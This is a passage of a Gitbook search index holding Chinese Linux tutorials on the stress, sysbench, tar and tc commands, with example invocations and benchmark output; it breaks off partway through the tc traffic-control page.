hogs: 0 cpu, 4 io, 0 vm, 0 hdd $ top %Cpu(s): 0.9 us, 52.9 sy, 0.0 ni, 46.2 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 8602 root 20 0 7308 100 0 R 58.5 0.0 0:54.75 stress 8599 root 20 0 7308 100 0 R 57.8 0.0 0:55.73 stress 8601 root 20 0 7308 100 0 R 57.8 0.0 0:55.80 stress 8600 root 20 0 7308 100 0 R 55.8 0.0 0:55.13 stress sy 升高 4.4 压测磁盘及 IO 创建一个进程不断的在磁盘上创建 10M 大小的文件并写入内容： $ stress -d 1 --hdd-bytes 10M 4.5 其它选项介绍 --verbose 显示 stress 程序运行过程中的详细信息 --timeout N 在 N 秒后结束程序。 --quiet stress 程序运行的过程中不输出信息。 -n, --dry-run 输出程序会做什么而并不实际执行相关的操作 --backoff N 让新 fork 出来的进程 sleep N 微秒再开始运行。 除了单独指定某一类的选项，还可以同时执行多个类型的任务，比如产生 3 个 CPU 进程、3 个 IO 进程、2 个10M 的 vm 进程，并且每个 vm 进程中不循环分配释放内存： $ stress --cpu 3 --io 3 --vm 2 --vm-bytes 10M --vm-keep 更多阅读： https://www.cnblogs.com/sparkdev/p/10354947.html How to Stress Test Your CPU in Linux stress(1) - Linux man page How to Impose High CPU Load and Stress Test on Linux Using ‘Stress-ng’ Tool How to stress test your Linux system Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_sysbench.html":{"url":"Linux-Command/Linux_Command_sysbench.html","title":"Linux Command Sysbench","keywords":"","body":"linux Command sysbench 线程压力测试工具1. 简介2. 安装2.1 Ubuntu2.2 centos2.3 编译安装3. 参数3.1 sysbench --test=fileio help3.2 sysbench --test=cpu help3.3 sysbench --test=memory help3.4 sysbench --test=threads help3.5 sysbench --test=mutex help3.6 sysbench --test=oltp help4. 测试4.1 测试 CPU4.2 测试线程4.3 测试 IO4.4 测试内存4.5 测试 mutex4.6 测试 OLTP4.7 测试OLTP 结合lua脚本linux Command sysbench 线程压力测试工具 tagsstart 测试 tagsstop 图 1.2.75.1：在这里插入图片描述 1. 简介 sysbench 是一个开源的、模块化的、跨平台的多线程性能测试工具，可以用来进行CPU、内存、磁盘I/O、线程、数据库的性能测试。目前支持的数据库有MySQL、Oracle和PostgreSQL。当前功能允许测试的系统参数有： file I/O performance （文件I / O性能） scheduler performance （调度性能） memory allocation and transfer speed （内存分配和传输速度） POSIX threads implementation performance （POSIX线程执行绩效） database server performance (OLTP benchmark) （数据库服务器性能） 2. 安装 2.1 Ubuntu apt-get install sysbench 2.2 centos yum -y install epel-release yum -y update yum install sysbench 2.3 编译安装 下载： sysbench-1.0.20 apt-get -y install automake libtool libtool-bin sysbench-1.0.20.zip unzip cd sysbench-1.0.20 mkdir /usr/sysbench/ ./autogen.sh 要是出现：perl: warning: Falling back to the standard locale (\"C\")。则需要设置locale: echo \"export LC_ALL=C\" >> /root/.bashrc source /root/.bashrc 要是没有安装开发包，即/usr/include/ 目录下面没有mysql文件夹。则需要执行安装(版本为12.04): sudo apt-get -y install libmysqlclient-dev sudo apt-get -y install libmysqld-dev sudo apt-get -y install libmysqld-pic 执行configure操作： ./configure --prefix=/usr/sysbench/ --with-mysql-includes=/usr/include/mysql/ --with-mysql-libs=/usr/lib/mysql/ --with-mysql 说明： --prefix=/usr/sysbench/ ：指定sysbench的安装目录。 --with-mysql-includes=/usr/include/mysql/ ：指定安装mysql时候的includes目录。 --with-mysql-libs=/usr/lib/mysql/ ：指定装mysql时候的lib目录。 --with-mysql ：sysbench默认支持mysql，如果需要测试oracle或者pgsql则需要制定–with-oracle或者–with-pgsql。 cp /usr/bin/libtool /root/sysbench-1.0.20 make && make install 3. 参数 $ sysbench --help Usage: sysbench [options]... [testname] [command] Commands implemented by most tests: prepare run cleanup help General options: --threads=N number of threads to use [1] --events=N limit for total number of events [0] --time=N limit for total execution time in seconds [10] --forced-shutdown=STRING number of seconds to wait after the --time limit before forcing shutdown, or 'off' to disable [off] #超过max-time强制中断。默认是off。 --thread-stack-size=SIZE size of stack per thread [64K] #每个线程的堆栈大小。默认是32K。 --rate=N average transactions rate. 0 for unlimited rate [0] --report-interval=N periodically report intermediate statistics with a specified interval in seconds. 0 disables intermediate reports [0] --report-checkpoints=[LIST,...] dump full statistics and reset all counters at specified points in time. The argument is a list of comma-separated values representing the amount of time in seconds elapsed from start of test when report checkpoint(s) must be performed. Report checkpoints are off by default. [] --debug[=on|off] print more debugging info [off] --validate[=on|off] perform validation checks where possible [off] --help[=on|off] print help and exit [off] --version[=on|off] print version and exit [off] --config-file=FILENAME File containing command line options --tx-rate=N deprecated alias for --rate [0] --max-requests=N deprecated alias for --events [0] #请求的最大数目。默认为10000，0代表不限制。 --max-time=N deprecated alias for --time [0] #最大执行时间，单位是s。默认是0,不限制 --num-threads=N deprecated alias for --threads [1] #创建测试线程的数目。默认为1. Pseudo-Random Numbers Generator options: --rand-type=STRING random numbers distribution {uniform,gaussian,special,pareto} [special] --rand-spec-iter=N number of iterations used for numbers generation [12] --rand-spec-pct=N percentage of values to be treated as 'special' (for special distribution) [1] --rand-spec-res=N percentage of 'special' values to use (for special distribution) [75] --rand-seed=N seed for random number generator. When 0, the current time is used as a RNG seed. [0] --rand-pareto-h=N parameter h for pareto distribution [0.2] Log options: --verbosity=N verbosity level {5 - debug, 0 - only critical messages} [3] --percentile=N percentile to calculate in latency statistics (1-100). Use the special value of 0 to disable percentile calculations [95] --histogram[=on|off] print latency histogram in report [off] General database options: --db-driver=STRING specifies database driver to use ('help' to get list of available drivers) --db-ps-mode=STRING prepared statements usage mode {auto, disable} [auto] --db-debug[=on|off] print database-specific debug information [off] Compiled-in database drivers: mysql - MySQL driver pgsql - PostgreSQL driver mysql options: --mysql-host=[LIST,...] MySQL server host [localhost] --mysql-port=[LIST,...] MySQL server port [3306] --mysql-socket=[LIST,...] MySQL socket --mysql-user=STRING MySQL user [sbtest] --mysql-password=STRING MySQL password [] --mysql-db=STRING MySQL database name [sbtest] --mysql-ssl[=on|off] use SSL connections, if available in the client library [off] --mysql-ssl-cipher=STRING use specific cipher for SSL connections [] --mysql-compression[=on|off] use compression, if available in the client library [off] --mysql-debug[=on|off] trace all client library calls [off] --mysql-ignore-errors=[LIST,...] list of errors to ignore, or \"all\" [1213,1020,1205] --mysql-dry-run[=on|off] Dry run, pretend that all MySQL client API calls are successful without executing them [off] pgsql options: --pgsql-host=STRING PostgreSQL server host [localhost] --pgsql-port=N PostgreSQL server port [5432] --pgsql-user=STRING PostgreSQL user [sbtest] --pgsql-password=STRING PostgreSQL password [] --pgsql-db=STRING PostgreSQL database name [sbtest] Compiled-in tests: fileio - File I/O test cpu - CPU performance test memory - Memory functions speed test threads - Threads subsystem performance test mutex - Mutex performance test 3.1 sysbench --test=fileio help $ sysbench --test=fileio help sysbench 1.0.11 (using system LuaJIT 2.1.0-beta3) fileio options: --file-num=N 创建测试文件的数量。默认是128 --file-block-size=N 测试时文件块的大小。默认是16384(16K) --file-total-size=SIZE 测试文件的总大小。默认是2G --file-test-mode=STRING 文件测试模式{seqwr(顺序写), seqrewr(顺序读写), seqrd(顺序读), rndrd(随机读), rndwr(随机写), rndrw(随机读写)} --file-io-mode=STRING 文件操作模式{sync(同步),async(异步),fastmmap(快速map映射),slowmmap(慢map映射)}。默认是sync --file-extra-flags=STRING 使用额外的标志来打开文件{sync,dsync,direct} 。默认为空 --file-fsync-freq=N 执行fsync()的频率。(0 – 不使用fsync())。默认是100 --file-fsync-all=[on|off] 每执行完一次写操作就执行一次fsync。默认是off --file-fsync-end=[on|off] 在测试结束时才执行fsync。默认是on --file-fsync-mode=STRING 使用哪种方法进行同步{fsync, fdatasync}。默认是fsync --file-merged-requests=N 如果可以，合并最多的IO请求数(0 – 表示不合并)。默认是0 --file-rw-ratio=N 测试时的读写比例。默认是1.5 3.2 sysbench --test=cpu help $ sysbench --test=cpu help sysbench 1.0.11 (using system LuaJIT 2.1.0-beta3) cpu options: --cpu-max-prime=N upper limit for primes generator [10000] 最大质数发生器数量。默认是10000 3.3 sysbench --test=memory help $ sysbench --test=memory help sysbench 0.4.12: multi-threaded system evaluation benchmark memory options: --memory-block-size=SIZE 测试时内存块大小。默认是1K --memory-total-size=SIZE 传输数据的总大小。默认是100G --memory-scope=STRING 内存访问范围{global,local}。默认是global --memory-hugetlb=[on|off] 从HugeTLB池内存分配。默认是off --memory-oper=STRING 内存操作类型。{read, write, none} 默认是write --memory-access-mode=STRING存储器存取方式{seq,rnd} 默认是seq 3.4 sysbench --test=threads help threads options: --thread-yields=N 每个请求产生多少个线程。默认是1000 --thread-locks=N 每个线程的锁的数量。默认是8 3.5 sysbench --test=mutex help mutex options: --mutex-num=N 数组互斥的总大小。默认是4096 --mutex-locks=N 每个线程互斥锁的数量。默认是50000 --mutex-loops=N 内部互斥锁的空循环数量。默认是10000 3.6 sysbench --test=oltp help oltp options: --oltp-test-mode=STRING 执行模式{simple,complex(advanced transactional),nontrx(non-transactional),sp}。默认是complex --oltp-reconnect-mode=STRING 重新连接模式{session(不使用重新连接。每个线程断开只在测试结束),transaction(在每次事务结束后重新连接),query(在每个SQL语句执行完重新连接),random(对于每个事务随机选择以上重新连接模式)}。默认是session --oltp-sp-name=STRING 存储过程的名称。默认为空 --oltp-read-only=[on|off] 只读模式。Update，delete，insert语句不可执行。默认是off --oltp-skip-trx=[on|off] 省略begin/commit语句。默认是off --oltp-range-size=N 查询范围。默认是100 --oltp-point-selects=N number of point selects [10] --oltp-simple-ranges=N number of simple ranges [1] --oltp-sum-ranges=N number of sum ranges [1] --oltp-order-ranges=N number of ordered ranges [1] --oltp-distinct-ranges=N number of distinct ranges [1] --oltp-index-updates=N number of index update [1] --oltp-non-index-updates=N number of non-index updates [1] --oltp-nontrx-mode=STRING 查询类型对于非事务执行模式{select, update_key, update_nokey, insert, delete} [select] --oltp-auto-inc=[on|off] AUTO_INCREMENT是否开启。默认是on --oltp-connect-delay=N 在多少微秒后连接数据库。默认是10000 --oltp-user-delay-min=N 每个请求最短等待时间。单位是ms。默认是0 --oltp-user-delay-max=N 每个请求最长等待时间。单位是ms。默认是0 --oltp-table-name=STRING 测试时使用到的表名。默认是sbtest --oltp-table-size=N 测试表的记录数。默认是10000 --oltp-dist-type=STRING 分布的随机数{uniform(均匀分布),Gaussian(高斯分布),special(空间分布)}。默认是special --oltp-dist-iter=N 产生数的迭代次数。默认是12 --oltp-dist-pct=N 值的百分比被视为'special' (for special distribution)。默认是1 --oltp-dist-res=N ‘special’的百分比值。默认是75 General database options: --db-driver=STRING 数据库类型，指定数据库驱动程序('help' to get list of available drivers) --db-ps-mode=STRING 数据库预处理模式{auto, disable} [auto] Compiled-in database drivers: mysql - MySQL driver mysql options: --mysql-host=[LIST,...] MySQL server host [localhost] --mysql-port=N MySQL server port [3306] --mysql-socket=STRING MySQL socket --mysql-user=STRING MySQL user [sbtest] --mysql-password=STRING MySQL password [] --mysql-db=STRING MySQL database name [sbtest] --mysql-table-engine=STRING storage engine to use for the test table {myisam,innodb,bdb,heap,ndbcluster,federated} [innodb] --mysql-engine-trx=STRING whether storage engine used is transactional or not {yes,no,auto} [auto] --mysql-ssl=[on|off] use SSL connections, if available in the client library [off] --myisam-max-rows=N max-rows parameter for MyISAM tables [1000000] --mysql-create-options=STRING additional options passed to CREATE TABLE [] 4. 测试 4.1 测试 CPU $ sysbench --test=cpu --cpu-max-prime=2000 run WARNING: the --test option is deprecated. You can pass a script name or path on the command line without any options. sysbench 1.0.11 (using system LuaJIT 2.1.0-beta3) Running the test with following options: Number of threads: 1 Initializing random number generator from current time Prime numbers limit: 2000 Initializing worker threads... Threads started! CPU speed: events per second: 7290.82 General statistics: total time: 10.0017s total number of events: 72939 Latency (ms): min: 0.09 avg: 0.14 max: 20.14 95th percentile: 0.24 sum: 9907.92 Threads fairness: events (avg/stddev): 72939.0000/0.00 execution time (avg/stddev): 9.9079/0.00 4.2 测试线程 $ sysbench --test=threads --num-threads=500 --thread-yields=100 --thread-locks=4 run WARNING: the --test option is deprecated. You can pass a script name or path on the command line without any options. WARNING: --num-threads is deprecated, use --threads instead sysbench 1.0.11 (using system LuaJIT 2.1.0-beta3) Running the test with following options: Number of threads: 500 Initializing random number generator from current time Initializing worker threads... Threads started! General statistics: total time: 10.1607s total number of events: 59317 Latency (ms): min: 0.05 avg: 84.75 max: 2438.83 95th percentile: 337.94 sum: 5027365.00 Threads fairness: events (avg/stddev): 118.6340/83.13 execution time (avg/stddev): 10.0547/0.05 4.3 测试 IO --num-threads 开启的线程 --file-total-size 总的文件大小 prepare阶段，生成需要的测试文件，完成后会在当前目录下生成很多小文件。 sysbench --test=fileio --num-threads=16 --file-total-size=2G --file-test-mode=rndrw prepare run阶段 sysbench --test=fileio --num-threads=20 --file-total-size=2G --file-test-mode=rndrw run 清理测试时生成的文件 sysbench --test=fileio --num-threads=20 --file-total-size=2G --file-test-mode=rndrw cleanup 4.4 测试内存 $ sysbench --test=memory --memory-block-size=8k --memory-total-size=1G run WARNING: the --test option is deprecated. You can pass a script name or path on the command line without any options. sysbench 1.0.11 (using system LuaJIT 2.1.0-beta3) Running the test with following options: Number of threads: 1 Initializing random number generator from current time Running memory speed test with the following options: block size: 8KiB total size: 1024MiB operation: write scope: global Initializing worker threads... Threads started! Total operations: 131072 (599444.59 per second) 1024.00 MiB transferred (4683.16 MiB/sec) General statistics: total time: 0.2148s total number of events: 131072 Latency (ms): min: 0.00 avg: 0.00 max: 4.26 95th percentile: 0.00 sum: 159.78 Threads fairness: events (avg/stddev): 131072.0000/0.00 execution time (avg/stddev): 0.1598/0.00 4.5 测试 mutex 略 4.6 测试 OLTP prepare阶段，生成需要的测试表 sysbench --test=oltp --mysql-table-engine=innodb --mysql-host=192.168.X.X --mysql-db=test --oltp-table-size=500000 --mysql-user=root --mysql-password=123456 prepare run阶段 sysbench --num-threads=16 --test=oltp --mysql-table-engine=innodb --mysql-host=192.168.x.x --mysql-db=test --oltp-table-size=500000 --mysql-user=root --mysql-password=123456 run 清理测试时生成的测试表 sysbench --num-threads=16 --test=oltp --mysql-table-engine=innodb --mysql-host=192.168.x.x --mysql-db=test --oltp-table-size=500000 --mysql-user=root --mysql-password=123456 cleanup 4.7 测试OLTP 结合lua脚本 $ dpkg -L sysbench /. /usr /usr/bin /usr/bin/sysbench /usr/share /usr/share/doc /usr/share/doc/sysbench /usr/share/doc/sysbench/README.md.gz /usr/share/doc/sysbench/changelog.Debian.gz /usr/share/doc/sysbench/copyright /usr/share/doc/sysbench/manual.html /usr/share/doc-base /usr/share/doc-base/sysbench-manual /usr/share/man /usr/share/man/man1 /usr/share/man/man1/sysbench.1.gz /usr/share/sysbench /usr/share/sysbench/bulk_insert.lua /usr/share/sysbench/oltp_common.lua /usr/share/sysbench/oltp_delete.lua /usr/share/sysbench/oltp_insert.lua /usr/share/sysbench/oltp_point_select.lua /usr/share/sysbench/oltp_read_only.lua /usr/share/sysbench/oltp_read_write.lua /usr/share/sysbench/oltp_update_index.lua /usr/share/sysbench/oltp_update_non_index.lua /usr/share/sysbench/oltp_write_only.lua /usr/share/sysbench/select_random_points.lua /usr/share/sysbench/select_random_ranges.lua 参数 --test=tests/db/oltp.lua 表示调用 tests/db/oltp.lua 脚本进行 oltp 模式测试 --mysql-table-engine=innodb 表示选择测试表的存储引擎 --oltp_tables_count=10 表示会生成 10 个测试表 --oltp-table-size=100000 表示每个测试表填充数据量为 100000 --rand-init=on 表示每个测试表都是用随机数据来填充的 --num-threads=8 表示发起 8个并发连接 --oltp-read-only=off 表示不要进行只读测试，也就是会采用读写混合模式测试 --report-interval=10 表示每10秒输出一次测试进度报告 --rand-type=uniform 表示随机类型为固定模式，其他几个可选随机模式：uniform(固定),gaussian(高斯),special(特定的),pareto(帕累托) --max-time=120 表示最大执行时长为 120秒 --max-requests=0 表示总请求数为 0，因为上面已经定义了总执行时长，所以总请求数可以设定为 0；也可以只设定总请求数，不设定最大执行时长 --percentile=99 表示设定采样比例，默认是 95%，即丢弃1%的长请求，在剩余的99%里取最大值 如果在本机，也可以使用 –mysql-socket 指定 socket 文件来连接。加载测试数据时长视数据量而定，若过程比较久需要稍加耐心等待。 初始化数据：prepare 在本地数据库的dba_test库中，初始化三张表（sbtest1、sbtest2、sbtest3），存储引擎是innodb，每张表50万数据。 sysbench --test=/usr/share/doc/sysbench/tests/db/oltp.lua --mysql-table-engine=innodb --mysql-host=127.0.0.1 --mysql-db=dba_test --oltp-table-size=500000 --oltp_tables_count=3 --rand-init=on --mysql-user=zjy --mysql-password=zjy prepare 如果是本机测试，所以也可以使用--mysql-socket指定socket文件来连接。 测试：run 模拟对3个表并发OLTP测试，每个表50万行记录，持续压测时间为5分钟。 sysbench --test=/usr/share/doc/sysbench/tests/db/oltp.lua --mysql-table-engine=innodb --mysql-host=127.0.0.1 --mysql-db=dba_test --num-threads=8 --oltp-table-size=500000 --oltp_tables_count=3 --oltp-read-only=off --report-interval=10 --rand-type=uniform --max-time=600 --max-requests=0 --percentile=99 --mysql-user=zjy --mysql-password=zjy run 结果： #每10秒钟报告一次测试结果，tps、每秒读、每秒写、95%以上的响应时长统计 [ 10s] threads: 8, tps: 66.60, reads: 943.67, writes: 269.62, response time: 431.72ms (95%), errors: 0.00, reconnects: 0.00 [ 20s] threads: 8, tps: 34.30, reads: 480.20, writes: 137.20, response time: 598.28ms (95%), errors: 0.00, reconnects: 0.00 [ 30s] threads: 8, tps: 36.60, reads: 512.40, writes: 146.40, response time: 494.87ms (95%), errors: 0.00, reconnects: 0.00 OLTP test statistics: queries performed: read: 941248 #读总数 write: 268928 #写总数 other: 134464 #其他操作总数(SELECT、INSERT、UPDATE、DELETE之外的操作，例如COMMIT等) total: 1344640 #全部总数 transactions: 67232 (112.04 per sec.) #总事务数(每秒事务数) read/write requests: 1210176 (2016.73 per sec.) #读写总数(每秒读写次数) other operations: 134464 (224.08 per sec.) #其他操作总数(每秒其他操作次数) ignored errors: 0 (0.00 per sec.) reconnects: 0 (0.00 per sec.) General statistics: total time: 600.0698s #总耗时 total number of events: 67232 #共发生多少事务数 total time taken by event execution: 4799.8569s # 所有事务耗时相加(不考虑并行因素) response time: min: 2.09ms #最小耗时 avg: 71.39ms #平均耗时 max: 839.32ms #最大耗时 approx. 95 percentile: 309.40ms 超过95%平均耗时 Threads fairness: events (avg/stddev): 8404.0000/17.56 execution time (avg/stddev): 599.9821/0.02 清理数据：cleanup sysbench --test=/usr/share/doc/sysbench/tests/db/oltp.lua --mysql-table-engine=innodb --mysql-host=127.0.0.1 --mysql-db=dba_test --num-threads=8 --oltp-table-size=500000 --oltp_tables_count=3 --oltp-read-only=off --report-interval=10 --rand-type=uniform --max-time=600 --max-requests=0 --mysql-user=zjy --mysql-password=zjy cleanup 参考： jyzhou 的sysbench 安装、使用和测试 https://github.com/akopytov/sysbench.git How to Benchmark Your System (CPU, File IO, MySQL) with Sysbench Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-20 15:51:36 "},"Linux-Command/Linux_Command_tar.html":{"url":"Linux-Command/Linux_Command_tar.html","title":"Linux Command Tar","keywords":"","body":"Linux Command tar 压缩1. 简介2. 格式3. 参数4. 举例4.1 将文件全部打包成tar包4.2 查阅上述 tar包内有哪些文件4.3 将tar 包解压缩4.4 只将 /tar 内的 部分文件解压出来4.5 文件备份下来，并且保存其权限4.6 在文件夹当中，比某个日期新的文件才备份4.7 备份文件夹内容是排除部分文件4.8 分卷压缩与解压缩Linux Command tar 压缩 tagsstart 文件管理 压缩解压 tagsstop 1. 简介 tar命令可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。 首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令） 2. 格式 tar[必要参数][选择参数][文件] 3. 参数 -A 新增压缩文件到已存在的压缩 -B 设置区块大小 -c 建立新的压缩文件 -d 记录文件的差别 -r 添加文件到已经压缩的文件 -u 添加改变了和现有的文件到已经存在的压缩文件 -x 从压缩的文件中提取文件 -t 显示压缩文件的内容 -z 支持gzip解压文件 -j 支持bzip2解压文件 -Z 支持compress解压文件 -v 显示操作过程 -l 文件系统边界设置 -k 保留原有文件不覆盖 -m 保留文件不被覆盖 -W 确认压缩文件的正确性 可选参数如下： -b 设置区块数目 -C 切换到指定目录 -f 指定压缩文件 --help 显示帮助信息 --version 显示版本信息 4. 举例 4.1 将文件全部打包成tar包 [root@localhost test]$ ls -al log2012.log ---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log [root@localhost test]$ tar -cvf log.tar log2012.log log2012.log [root@localhost test]$ tar -zcvf log.tar.gz log2012.log log2012.log [root@localhost test]$ tar -jcvf log.tar.bz2 log2012.log log2012.log [root@localhost test]$ ls -al *.tar* -rw-r--r-- 1 root root 307200 11-29 17:54 log.tar -rw-r--r-- 1 root root 1413 11-29 17:55 log.tar.bz2 -rw-r--r-- 1 root root 1413 11-29 17:54 log.tar.gz 说明： tar -cvf log.tar log2012.log 仅打包，不压缩！ tar -zcvf log.tar.gz log2012.log 打包后，以 gzip 压缩 tar -zcvf log.tar.bz2 log2012.log 打包后，以 bzip2 压缩 在参数 f 之后的文件档名是自己取的，我们习惯上都用 .tar 来作为辨识。 如果加 z 参数，则以 .tar.gz 或 .tgz 来代表 gzip 压缩过的 tar包； 如果加 j 参数，则以 .tar.bz2 来作为tar包名。 4.2 查阅上述 tar包内有哪些文件 [root@localhost test]$ tar -ztvf log.tar.gz ---xrw-r-- root/root 302108 2012-11-13 06:03:25 log2012.log 说明： 由于我们使用 gzip 压缩的log.tar.gz，所以要查阅log.tar.gz包内的文件时，就得要加上 z 这个参数了。 4.3 将tar 包解压缩 [root@localhost test3]$ ll 总计 0 [root@localhost test3]$ tar -zxvf /opt/soft/test/log.tar.gz log2012.log [root@localhost test3]$ ls log2012.log 说明： 在预设的情况下，我们可以将压缩档在任何地方解开的 4.4 只将 /tar 内的 部分文件解压出来 [root@localhost test]$ tar -zcvf log30.tar.gz log2012.log log2013.log log2012.log log2013.log [root@localhost test]$ ls -al log30.tar.gz -rw-r--r-- 1 root root 1512 11-30 08:19 log30.tar.gz [root@localhost test]$ tar -zxvf log30.tar.gz log2013.log log2013.log [root@localhost test]$ ll -rw-r--r-- 1 root root 1512 11-30 08:19 log30.tar.gz [root@localhost test]$ cd test3 [root@localhost test3]$ tar -zxvf /opt/soft/test/log30.tar.gz log2013.log log2013.log [root@localhost test3]$ ll 总计 4 -rw-r--r-- 1 root root 61 11-13 06:03 log2013.log 说明： 我可以透过 tar -ztvf 来查阅 tar 包内的文件名称，如果单只要一个文件，就可以透过这个方式来解压部分文件！ 4.5 文件备份下来，并且保存其权限 [root@localhost test]# ll 总计 0 -rw-r--r-- 1 root root 0 11-13 06:03 log2014.log -rw-r--r-- 1 root root 0 11-13 06:06 log2015.log -rw-r--r-- 1 root root 0 11-16 14:41 log2016.log [root@localhost test]$ tar -zcvpf log31.tar.gz log2014.log log2015.log log2016.log log2014.log log2015.log log2016.log [root@localhost test]$ cd test6 [root@localhost test6]$ ll [root@localhost test6]$ tar -zxvpf /opt/soft/test/log31.tar.gz log2014.log log2015.log log2016.log [root@localhost test6]$ ll 总计 0 -rw-r--r-- 1 root root 0 11-13 06:03 log2014.log -rw-r--r-- 1 root root 0 11-13 06:06 log2015.log -rw-r--r-- 1 root root 0 11-16 14:41 log2016.log 说明： 这个 -p 的属性是很重要的，尤其是当您要保留原本文件的属性时 4.6 在文件夹当中，比某个日期新的文件才备份 [root@localhost soft]$ tar -N \"2012/11/13\" -zcvf log17.tar.gz test tar: Treating date `2012/11/13' as 2012-11-13 00:00:00 + 0 nanoseconds test/test/log31.tar.gz test/log2014.log test/linklog.log test/log2015.log test/log2013.log test/log2012.log test/log2017.log test/log2016.log test/log30.tar.gz test/log.tar test/log.tar.bz2 test/log.tar.gz 4.7 备份文件夹内容是排除部分文件 [root@localhost test]$ tree scf scf |-- bin |-- doc |-- lib |-- service [root@localhost test]$ tar --exclude scf/service -zcvf scf.tar.gz scf/* scf/bin/ scf/doc/ scf/lib/ 4.8 分卷压缩与解压缩 将10G大小的log文件2017.log打包压缩并分割成多个100m的文件 # 分卷压缩gz $ tar zcf - 2017.log |split -d -b 100m - logs.tar.gz. # 生成文件： logs.tar.gz.00 logs.tar.gz.01 # 分卷压缩bz2 $ tar jcf - 2017.log |split -d -b 100m - logs.tar.bz2. # 生成文件： logs.tar.bz2.00 logs.tar.bz2.01 合并分卷解压缩 # 解压gz分卷 $ cat logs.tar.gz* | tar zx # 解压bz2分卷 $ cat logs.tar.bz2* | tar jx 更多阅读： Linux Command lz4 压缩 Linux Command tar 压缩 Linux Command gzip 压缩 Linux Command zip 压缩 图 1.2.76.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_tc.html":{"url":"Linux-Command/Linux_Command_tc.html","title":"Linux Command Tc","keywords":"","body":"Linux Command tc 模拟网络延迟和丢包1. 介绍2. 规则2.1 流量控制方式2.2 流量控制处理对象3. 操作原理4. 命名规则5. 单位6. 安装7. 命令8. 常用命令9. 案例Linux Command tc 模拟网络延迟和丢包 图 1.2.77.1：在这里插入图片描述 1. 介绍 Linux 操作系统中的流量控制器 TC(Traffic Control) 用于Linux内核的流量控制，它利用队列规定建立处理数据包的队列，并定义队列中的数据包被发送的方式，从而实现对流量的控制。TC 模块实现流量控制功能使用的队列规定分为两类，一类是无类队列规定，另一类是分类队列规定。无类队列规定相对简单，而分类队列规定则引出了分类和过滤器等概念，使其流量控制功能增强。 无类队列规定是对进入网络设备（网卡）的数据流不加区分统一对待的队列规定。使用无类队列规定形成的队列能够接收数据包以及重新编排、延迟或丢弃数据包。这类队列规定形成的队列可以对整个网络设备（网卡）的流量进行整形，但不能细分各种情况。常用的无类队列规定主要有 pfifo_fast（先进先出）、TBF（令牌桶过滤器）、SFQ（随机公平队列）、ID（前向随机丢包）等等。这类队列规定使用的流量整形手段主要是排序、限速和丢包。 分类队列规定是对进入网络设备的数据包根据不同的需求以分类的方式区分对待的队列规定。数据包进入一个分类的队列后，它就需要被送到某一个类中，也就是说需要对数据包做分类处理。对数据包进行分类的工具是过滤器，过滤器会返回一个决定，队列规定就根据这个决定把数据包送入相应的类进行排队。每个子类都可以再次使用它们的过滤器进行进一步的分类。直到不需要进一步分类时，数据包才进入该类包含的队列排队。除了能够包含其他队列规定之外，绝大多数分类的队列规定还能够对流量进行整形。这对于需要同时进行调度（如使用SFQ）和流量控制的场合非常有用。 Linux流量控制的基本原理如下图所示： 接收包从输入接口（Input Interface）进来后，经过流量限制（Ingress Policing）丢弃不符合规定的数据包，由输入多路分配器（Input De-Multiplexing）进行判断选择。如果接收包的目的地是本主机，那么将该包送给上层处理，否则需要进行转发，将接收包交到转发块（Forwarding Block）处理。转发块同时也接收本主机上层（TCP、UDP等）产生的包。转发块通过查看路由表，决定所处理包的下一跳。然后，对包进行排列以便将它们传送到输出接口（Output Interface）。一般我们只能限制网卡发送的数据包，不能限制网卡接收的数据包，所以我们可以通过改变发送次序来控制传输速率。Linux流量控制主要是在输出接口排列时进行处理和实现的。 2. 规则 2.1 流量控制方式 流量控制包括一下几种方式：SHAPING、SCHEDULING、POLICING、DROPPING； SHAPING（限制） 当流量被限制时，它的传输速率就被控制在某个值以下。限制值可以大大小于有效带宽，这样可以平滑突发数据流量，使网络更为稳定。SHAPING（限制）只适用于向外的流量。 SCHEDULING（调度） 通过调度数据包的传输，可以在带宽范围内，按照优先级分配带宽。SCHEDULING（调度）也只适用于向外的流量。 POLICING（策略） SHAPING（限制）用于处理向外的流量，而POLICING（策略）用于处理接收到的数据。 DROPPING（丢弃） 如果流量超过某个设定的带宽，就丢弃数据包，不管是向内还是向外。 2.2 流量控制处理对象 流量的处理由三种对象控制，它们是：qdisc（排队规则）、class（类别）和filter（过滤器）。 qdisc（排队规则）是 queueing discipline的简写，它是理解流量控制（traffic control）的基础。无论何时，内核如果需要通过某个网络接口发送数据包，它都需要按照为这个接口配置的qdisc（排队规则）把数据包加入队列。然后，内核会尽可能多的从qdisc里面取出数据包，把它们交给网络适配器驱动模块。最简单的qdisc是pfifo他不对进入的数据包做任何的处理，数据包采用先进先出的方式通过队列。不过，它会保存网络接口一时无法处 理的数据包。 qddis（排队规则）分为 CLASSLESS QDISC和 CLASSFUL QDISC； CLASSLESS QDISC （无类别QDISC）包括： [ p | b ]fifo,使用最简单的qdisc（排队规则），纯粹的先进先出。只有一个参数：limit ，用来设置队列的长度，pfifo是以数据包的个数为单位；bfifo是以字节数为单位。 pfifo_fast，在编译内核时，如果打开了高级路由器（Advanced Router）编译选项，pfifo_fast 就是系统的标准qdisc(排队规则)。它的队列包括三个波段（band）。在每个波段里面，使用先进先出规则。而三个波段（band）的优先级也不相同，band 0 的优先级最高，band 2的最低。如果band 0里面有数据包，系统就不会处理band 1 里面的数据包，band 1 和 band 2 之间也是一样的。数据包是按照服务类型（Type Of Service，TOS ）被分配到三个波段（band）里面的。 red，red是Random Early 